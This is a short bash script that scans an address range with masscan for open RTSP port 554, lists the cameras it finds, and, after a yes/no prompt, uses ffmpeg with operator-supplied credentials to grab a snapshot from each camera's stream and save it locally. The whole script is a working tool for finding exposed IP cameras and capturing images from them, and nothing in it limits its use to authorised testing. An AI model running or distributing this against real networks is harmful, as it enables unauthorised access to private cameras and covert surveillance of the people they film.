#!/bin/bash

 masscan -p554 $1 -oG session.masscam  --rate=100
  if [[ $? -ne 0 ]] ; then
      exit 1
  fi
 grep -oP '(?<=Host: )\S*' session.masscam >openports.masscam
 printf "[+] Sacnning for available cams....\n------------------------------------------------------------------------------------\n"
 echo

cat openports.masscam -u |& tee cameras.masscam.txt
 rm session.masscam openports.masscam
 printf  "\n------------------------------------------------------------------------------------\n"
 echo -n "Do you also want to take pictures?"
 echo
 function yes_or_no {
    while true; do
        read -p "$* [y/n]: " yn
        case $yn in
            [Yy]*) return 0  ;;  
            [Nn]*) echo "Aborted" ; return  1 ;;
        esac
    done
 }
 echo
  yes_or_no "$message" &&

 file=cameras.masscam.txt
 echo
  printf "[+] Taking pictures....\n------------------------------------------------------------------------------------\n"
  while read line ; do
  
    ip=$( echo "$line")
    ffmpeg -y -nostdin -loglevel fatal -rtsp_transport tcp -i rtsp://username:password'$'@$ip:554 -vframes 1 $ip.jpg  ### INPUT RTSP DIGEST USERNAME AND PASSWORD IN RESPECTIVE FIELDS
    printf  "\n------------------------------------------------------------------------------------\n"
    echo
    echo -n "[i]"  $ip.jpg" SAVED TO WORKING DIRECTORY"
    echo
  done < ${file}
 echo
 COUNT=$(grep -c ".*" cameras.masscam.txt)
 echo -n "[i]" $COUNT "IP-CAMS SAVED TO: cameras.masscam.txt"
 echo    
